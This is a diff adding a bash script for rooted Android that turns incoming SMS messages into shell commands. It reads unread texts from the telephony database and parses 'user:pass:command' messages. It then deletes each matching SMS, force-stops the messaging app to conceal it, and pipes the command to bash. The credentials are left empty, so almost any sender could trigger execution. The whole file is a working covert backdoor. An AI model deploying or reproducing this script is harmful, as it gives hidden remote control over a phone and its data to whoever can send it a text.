@@ -1,0 +1,79 @@
+#!/system/xbin/bash 
+DBFILE='/data/data/com.android.providers.telephony/databases/mmssms.db'
+PIDFILE='/sdcard/msg.pid'
+LOGFILE='/sdcard/msglog.txt'
+username=''
+password=''
+
+if [[ -f $PIDFILE ]];then
+	PID=`cat $PIDFILE 2>/dev/null`
+	if [ -d /proc/$PID ];then
+		echo "process already running with pid:$PID"
+		exit 1
+	else
+		echo $$ > $PIDFILE
+		if [ $? -ne 0 ];then
+			echo "could not create file"
+			exit 1
+		fi
+	fi
+else
+	echo $$ > $PIDFILE
+fi
+function getUnreadID(){
+	unreadID=`sqlite3 -batch $DBFILE 'select _id from sms where read=0'`
+}
+
+function getSender(){
+	sender=`sqlite3 -batch $DBFILE "select address from sms where _id=$1"`
+}
+
+function getBody(){
+	body=`sqlite3 -batch $DBFILE "select body from sms where _id=$1"`
+}
+
+function Delete(){
+	`sqlite3 -batch $DBFILE "delete from sms where _id=$1"`
+}
+
+function checkAuth(){
+	auth=0
+	if [[ "$username" == "$1" ]];then
+		if [[ "$password" == "$2" ]];then
+			auth=1
+		fi
+	fi
+}
+
+function checkRCE(){
+	getBody $1
+	colons=`echo "$body" | grep -o ':' | wc -l`
+	if [[ $colons -eq 2 ]];then
+		ISRCE=1
+	fi
+}
+
+function Parser(){
+	user=`echo $body| cut -d ':' -f 1`
+	pass=`echo $body| cut -d ':' -f 2`
+	cmd=`echo $body| cut -d ':' -f 3`
+}
+
+###main exec
+getUnreadID
+for i in $unreadID
+do
+	checkRCE $i
+	if [[ $ISRCE -eq 1 ]];then
+		Parser
+		checkAuth $user $pass
+		if [[ $auth -eq 1 ]];then
+			getSender $i
+			echo "$sender" `date` $cmd >> $LOGFILE
+			Delete $i
+			am force-stop com.android.mms
+			echo $cmd |bash
+		fi
+	fi
+done
+rm $PIDFILE 2>/dev/null
